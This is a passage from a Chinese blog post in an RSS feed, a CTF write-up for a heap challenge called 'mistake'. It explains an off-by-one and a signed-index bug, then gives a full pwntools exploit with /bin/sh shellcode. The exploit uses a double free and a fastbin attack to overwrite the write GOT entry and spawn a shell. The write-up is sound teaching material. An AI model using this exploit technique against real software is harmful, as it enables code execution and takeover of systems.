class="line">	<span class="keyword">for</span>(i = id;i &lt; <span class="number">0x2f</span>;i++)&#123;</div><div class="line">		<span class="built_in">list</span>[i] = <span class="built_in">list</span>[i+<span class="number">1</span>];</div><div class="line">	&#125;</div><div class="line">	write(<span class="number">1</span>,<span class="string">"delete successfully\n"</span>,<span class="number">20</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">	chunk_number = <span class="number">-1</span>;</div><div class="line">	<span class="keyword">char</span> input[<span class="number">2</span>];</div><div class="line">	<span class="keyword">int</span> selete;</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">		menu();</div><div class="line">		read(<span class="number">0</span>,input,<span class="number">2</span>);</div><div class="line">		input[<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">		<span class="keyword">if</span>(!(selete = atoi(input)))&#123;</div><div class="line">			write(<span class="number">1</span>,<span class="string">"Invalid input.\n"</span>,<span class="number">15</span>);</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">switch</span>(selete)&#123;</div><div class="line">		<span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">			create_chunk();</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">			read_chunk();</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">			free_chunk();</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">			write(<span class="number">1</span>,<span class="string">"bye~\n"</span>,<span class="number">5</span>);</div><div class="line">			<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">		<span class="keyword">default</span>:</div><div class="line">			write(<span class="number">1</span>,<span class="string">"Invalid input\n"</span>,<span class="number">15</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>题目是协会的一个学弟(@spine)出的</p>
<p>再给个Dockerfile吧：<a href="https://github.com/Hcamael/docker_lib/tree/master/heap/mistake" target="_blank" rel="external">https://github.com/Hcamael/docker_lib/tree/master/heap/mistake</a></p>
<p>这题感觉对于新手挺有难度的，第一次做的时候花了很长时间，然后现在复习还花了很长时间捡起来</p>
<p>这题的漏洞点在一个很小的地方，在<code>create_chunk</code>，这里对输入进行检查，chunk_number的最大值为0x2f，看着是没问题，但是再判断完以后让chunk_number进行自增，也就是到0x30了，list[0x30]是不是溢出了？但是这里溢出看着危害好像不大，但是进过一系列细微的操作，可以造成double free.</p>
<p>我想了很久要怎么总结pwn题，最后觉得还是一开始先点出漏洞点，然后贴出payload，再对payload进行解释，所以，payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment"># context.log_level = 'debug'</span></div><div class="line"></div><div class="line">shellcode1 = <span class="string">"jhH\xb8/bin///sP\xeb\x21"</span></div><div class="line">shellcode2 = <span class="string">"H\x89\xe71\xf6j;X\x99\x0f\x05"</span></div><div class="line">p = process(<span class="string">'./mistake'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_free</span><span class="params">()</span>:</span></div><div class="line">	p.sendline(<span class="string">'3'</span>)</div><div class="line">	p.sendline(<span class="string">'47'</span>)</div><div class="line">	<span class="keyword">print</span> p.recv()</div><div class="line">	p.sendline(<span class="string">'3'</span>)</div><div class="line">	p.sendline(<span class="string">'0'</span>)</div><div class="line">	<span class="keyword">print</span> p.recv()</div><div class="line">	p.sendline(<span class="string">'3'</span>)</div><div class="line">	p.sendline(<span class="string">'46'</span>)</div><div class="line">	<span class="keyword">print</span> p.recv()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_fd</span><span class="params">()</span>:</span></div><div class="line">	p.sendline(<span class="string">'1'</span>)</div><div class="line">	p.sendline(p64(<span class="number">0x602080</span><span class="number">-8</span>))</div><div class="line">	<span class="keyword">print</span> p.recv()</div><div class="line">	p.sendline(<span class="string">'1'</span>)</div><div class="line">	p.sendline(shellcode2)</div><div class="line">	<span class="keyword">print</span> p.recv()</div><div class="line">	p.sendline(<span class="string">'1'</span>)</div><div class="line">	p.sendline(shellcode2)</div><div class="line">	<span class="keyword">print</span> p.recv()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_del</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">3</span>):</div><div class="line">		p.sendline(<span class="string">'3'</span>)</div><div class="line">		p.send(str(<span class="number">0xfffffffd</span>))</div><div class="line">		<span class="keyword">print</span> p.recv()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_chunk</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0x31</span>):</div><div class="line">		p.sendline(<span class="string">'1'</span>)</div><div class="line">		<span class="keyword">print</span> p.recv()</div><div class="line">		<span class="keyword">if</span> x == <span class="number">1</span>:</div><div class="line">			p.sendline(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			p.sendline(shellcode2)</div><div class="line">		<span class="keyword">print</span> p.recv()</div><div class="line"></div><div class="line">create_chunk()</div><div class="line"><span class="keyword">print</span> <span class="string">"===create over=========="</span></div><div class="line">double_free()</div><div class="line"><span class="keyword">print</span> <span class="string">"====double free over===="</span></div><div class="line">free_del()</div><div class="line"><span class="keyword">print</span> <span class="string">"=====del over=========="</span></div><div class="line">malloc_fd()</div><div class="line"></div><div class="line"><span class="comment"># 控制chunk_number</span></div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.send(p64(<span class="number">0xffffffef</span>))</div><div class="line"></div><div class="line"><span class="keyword">print</span> p.recv()</div><div class="line"></div><div class="line">p.sendline(<span class="string">'3'</span>)</div><div class="line">p.send(<span class="string">'4294967291'</span>)</div><div class="line"><span class="keyword">print</span> p.recv()</div><div class="line"></div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.sendline(shellcode1)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>之前程序里写了编译方式，这题我们是关闭NX的，所以就要想着怎么可以执行shellcode</p>
<p>再讲payload的时候，先提下，我们需要关注几个地方，一个是存放chunk地址的list，还有就是使用libheap的fastbins命令查看fastbin情况</p>
<p>payload的第一步是<code>create_chunk()</code>函数，创造出最大值0x31个chunk，chunk的赋值之后就知道其意义</p>
<p>这个时候list的情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">list[0]</div><div class="line">list[1]</div><div class="line">list[2]</div><div class="line">......</div><div class="line">list[46]</div><div class="line">list[47]</div><div class="line">----overflow----</div><div class="line">list[48]</div></pre></td></tr></table></figure>
<p>然后就会产生2free了，看<code>double_free()</code>，首先是只有free(list[47])操作，我们list[47]的值称为list47，这个时候<code>fastbin -&gt; list47</code></p>
<p>第二次是free(list[0])，我们把list[0]称为list0，这个时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fastbin -&gt; list0</div><div class="line">list0.fd -&gt; list47</div></pre></td></tr></table></figure>
<p>但是除了free的操作，还会进行清除list[0]的移位操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">list[0] = list[1]</div><div class="line">list[1] = list[2]</div><div class="line">......</div><div class="line">list[45] = list[46]</div><div class="line">list[46] = list[47]</div></pre></td></tr></table></figure>
<p>然后我们再free(list[46])，这个时候list[46]的值为list47，而list47是被free过的，所以就造成了double free</p>
<p>这个时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fastbin -&gt; list47</div><div class="line">list47.fd -&gt; list0</div><div class="line">list0.fd -&gt; list47</div></pre></td></tr></table></figure>
<p>然后，就涉及到了第二个bug，<code>int chunk_number;</code>，chunk_number的值为int，所以在free_chunk函数中，id&gt;chunk_number的比较可以让id为负数来bypass</p>
<p>看之后的payload，free了3次list[-3] (list[-3] == list[0xfffffffd])</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.bss:0000000000602080 chunk_number    dd</div><div class="line">.bss:0000000000602084                 align 20h</div><div class="line">.bss:00000000006020A0                 public list</div><div class="line">.bss:00000000006020A0 ; void *list</div></pre></td></tr></table></figure>
<p>通过ida可以看到list[-3]的地址为0x0602088，值为0(不知道为啥list和chunk_number之间有28byte没被使用的内存)</p>
<p>所以我们实际执行的是3次free(0)，而该操作并不会改变啥，所以实际的效果只有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">list[-3] = list[0]</div><div class="line">list[-2] = list[1]</div><div class="line">list[-1] = lsit[2]</div><div class="line">......</div><div class="line">list[44] = list[47]</div><div class="line">list[45] = list[47]</div><div class="line">list[46] = list[47]</div></pre></td></tr></table></figure>
<p>但是和刚执行完<code>create_chunk</code>后的初始结果相比，是这样的:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">list[-3] = list[1]</div><div class="line">list[-2] = list[2]</div><div class="line">list[-1] = lsit[3]</div><div class="line">......</div><div class="line">list[43] = list[47]</div><div class="line">list[44] = list[47]</div><div class="line">list[45] = list[47]</div><div class="line">list[46] = list[47]</div></pre></td></tr></table></figure>
<p> 这个时候执行<code>malloc_fd</code>函数，我们回头再看看现在fastbin的情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fastbin -&gt; list47</div><div class="line">list47.fd -&gt; list0</div><div class="line">list0.fd -&gt; list47</div></pre></td></tr></table></figure>
<p>所以，第一次malloc，我们得到的是list47的地址，然后在list47.fd的位置写入了<code>p64(0x602080-8)</code></p>
<p>第二次malloc，获取到的是list0的地址</p>
<p>第三次malloc，获取到又是list47的地址，这个时候，fastbin将会指向list47的fd：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fastbin -&gt; 0x602078</div></pre></td></tr></table></figure>
<p>为什么我们让fastbin指向这个地址？因为fastbin在malloc的时候会对size进行检查，也就是检查address+8的值是否为合法size</p>
<p>如果fastbin指向0x602078，则会检查0x602080是否是合法size，这个地址为存储的是chunk_number，我们可以仔细计算下，这个时候的chunk_number=0x2e(0b101110)，是一个合法的地址，所以这个时候我们可以成功malloc，返回地址0x602088，然后更新fastbin，fastbin指向的是0x602078的fd，也就是0x602088，这个地址是list[-3]， 根据上面分析的，这个值也就是初始的list[1]，所以在payload中，我们在这个位置写入的是<code>p64(0)+p64(0x21)</code>，为了之后能成功malloc所伪造的头。</p>
<p>这时的fastbin:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fastbin -&gt; old_list1</div></pre></td></tr></table></figure>
<p>然后我们向0x602088写入0x10byte的数据，我们在这个地方写入的是p64(0xffffffef)，也就是-17</p>
<p>之后我们再free(list[-5]) -&gt; free(*0x602078) -&gt; free(0)， 不会发生啥，但是free_chunk除了调用free函数外还有一个操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">list[-5] = list[-4]</div><div class="line">list[-4] = list[-3]</div><div class="line">......</div><div class="line">其中</div><div class="line">list[-4] = 0x602080        </div><div class="line">list[-3] = 0x602088</div></pre></td></tr></table></figure>
<p>其中0x602080为chunk_number的地址，所以经过这个操作后，chunk_number的地址被修改为了0x602088地址的值，在上面我们可以看到，值为0xffffffef</p>
<p>最后一步，首先是chunk_number自增，得到0xfffffff0</p>
<p>然后是malloc获得old_list1 + 16地址，写入shellcode</p>
<p>然后在源码中的操作是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list[chunk_number] = tmp;</div></pre></td></tr></table></figure>
<p>list的地址是0x6020a0</p>
<p>chunk_number的值为0xfffffff0</p>
<p>所以最后是向0x6020a0 + 8*0xfffffff0 = 0x602020地址写入old_list1 + 16(也就是shellcode地址的值)</p>
<p>在我编译出来的程序中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.got.plt:0000000000602020 off_602020      dq offset write</div></pre></td></tr></table></figure>
<p>0x602020是write的got地址，所以修改了write的got表地址为shellcode地址</p>
<p>所以之后调用write，将会跳到shellcode地址，因为NX没开，所以堆栈可执行，可以成功执行shellcode，导致getshell</p>
<p>PS：payload中的shellcode2没啥用，只是我测试时候用的，这个相当于padding，看payload的时候别纠结这个，之前输入有意义的一个是list[1]构造chunk header，一个就是最后的shellcode1了，其他的基本算是padding</p>
<p>参考：</p>
<ol>
<li><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="external">malloc.c</a></li>
<li><a href="https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400?ref=http://4ngelboy.blogspot.com/" target="_blank" rel="external">Heap Exploitation</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="external">Understanding glibc malloc</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">Syscalls used by malloc</a></li>
<li><a href="http://static.hx99.net/static/drops/binary-7958.html" target="_blank" rel="external">Double Free浅析</a></li>
</ol>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/07/25/0x35/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
